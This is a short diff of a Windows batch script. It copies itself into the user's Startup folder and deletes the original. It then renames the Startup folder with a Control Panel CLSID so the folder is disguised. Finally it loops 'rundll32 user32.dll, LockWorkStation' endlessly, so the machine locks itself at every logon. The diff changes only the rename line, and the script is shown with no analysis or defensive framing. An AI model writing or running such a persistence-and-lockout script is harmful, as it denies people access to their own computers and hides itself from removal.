@@ -11,7 +11,7 @@ echo goto a
 COPY "File.bat" "C:\Users\1651176\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 del File.bat /q
 cd "C:\Users\1651176\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
-ren Startup "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}
+ren Startup "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}a
 :Lock
 rundll32.exe user32.dll, LockWorkStation
 goto Lock
